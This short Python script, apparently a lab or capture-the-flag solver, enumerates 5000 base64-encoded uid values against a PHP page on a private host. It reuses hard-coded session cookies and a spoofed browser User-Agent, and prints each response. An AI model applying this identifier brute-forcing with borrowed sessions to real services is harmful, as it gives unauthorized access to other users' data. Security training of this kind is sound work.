import requests,re
import base64
for i in range(5000):
    a='T_{0}_F'.format(i)
    a = a.encode("utf-8")
    url='http://10.55.2.161/stage/7/main.php?uid={0}'.format(str(base64.b64encode(a),encoding="utf-8"))
    print(url)
    header={"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"}
    cookie={"Cookie":"PHPSESSID=n90ksaiimj1ao08g6g2sc86uot; ASPSESSIONIDASTBRSBS=IJEOAMMBPPPIBNFNKIBAMKCP; ASPSESSIONIDCQCASTBR=JGOAHLMBHIMLAHENHMAMPEIE"}
    reponse=requests.get(url,cookies=cookie,headers=header)
    reall=reponse.content.decode('utf-8')
    print(reall)